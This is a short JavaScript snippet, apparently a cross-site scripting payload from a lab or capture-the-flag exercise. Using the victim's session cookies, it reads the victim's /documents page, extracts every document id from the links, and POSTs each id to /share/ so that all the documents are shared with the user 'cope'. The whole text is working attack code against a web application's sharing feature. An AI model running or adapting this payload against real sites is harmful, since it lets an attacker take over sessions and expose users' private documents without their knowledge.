fetch("/documents")
  .then((response) => response.text())
  .then((response) => {
    response.match(/href="\/viewdocument\/(.*)"/gm).forEach((match) => {
      const id = match.substring(20, 52);
      fetch(`/share/${id}`, {
        method: "POST",
        body: "username=cope",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });
    });
  });
